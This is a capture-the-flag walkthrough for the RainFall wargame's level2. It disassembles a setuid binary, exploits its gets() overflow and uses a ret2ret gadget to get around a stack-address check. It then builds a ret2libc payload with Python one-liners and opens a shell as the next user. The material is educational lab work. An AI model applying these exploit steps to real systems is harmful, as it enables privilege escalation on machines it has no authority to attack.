# Walkthrough

I noticed a binary file named 'level2' while listing the files in my home directory. In order to understand it better, I used gdb to disassemble the main function.

```c
Dump of assembler code for function main:
 0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
```

I found that the main function calls a p() function, which checks if the return function equals 0xb0000000 by using an operator with 0xb0000000. If true, it prints the address and exits. If false, it reads from the input and displays it, then duplicates it.

```c
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
```
 I discovered that the 'gets' function used in the program is highly dangerous as it can cause a buffer overflow, so I tested it by inputting a long string, which resulted in a segfault. 
 

```c
(gdb) run
Starting program: /home/user/level2/level2 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

To successfully execute the program and return to a new address of the system function while passing the "/bin/sh" parameter, I needed to determine the offset between the buffer and the return address. I found that the return address was located at $ebp+0x4, and the start of the buffer was at $ebp-0x4c. Therefore, I calculated the offset as follows:
 
 ```
 (gdb) x/wx $ebp+0x4
 0xbffff62c: 0x0804854a
 (gdb) x/wx $ebp-0x4c
 0xbffff5dc: 0x00000001
 (gdb) p 0xbffff62c - 0xbffff5dc
 $1 = 80
 ```

Next, I needed to locate the address of the system function and determine how to pass the "/bin/sh" parameter to it. To achieve this, I followed these steps:

```c
(gdb) p system
$2 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) info proc mappings
process 3465
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
```

 However, there was a condition that checked if the and operator between the return address and the 0xb0000000 value equaled to 0xb0000000. The address of the system function starts with 0xb, so this condition would always be true, causing the program to exit. 
 
To fill the buffer with the necessary information, I used Python to generate a string consisting of As that would overwrite the return address with the address of the system function. Additionally, I included randomly generated data for the return address of the system() function and the address of the "/bin/sh" parameter.
```sh
level2@RainFall:~$ python2 -c  'print("A" * 80 + "\xb7\xe6\xb0\x60"[::-1] + "BBBB" + "\xb7\xf8\xcc\x58"[::-1])' > /tmp/flag
level2@RainFall:~$ cat /tmp/flag  | ./level2 
(0xb7e6b060)

```
 
 To solve this issue, I needed to overwrite the return address with the address of the return address of the p() function `(0x0804853e)`. Then I overwrote the next bytes with the address of the system() call `(0xb7e6b060)`, followed by randomly filled data`(BBBB)`, and the last byte with the address of the "/bin/sh" parameter `(0xb7f8cc58)`.

```sh
level2@RainFall:~$ python2 -c  'print("A" * 80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "BBBB" + "\xb7\xf8\xcc\x58"[::-1])' > /tmp/flag
level2@RainFall:~$ cat /tmp/flag - | ./level2 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`��BBBBX���
whoami
level3
cd ../level3
ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3

```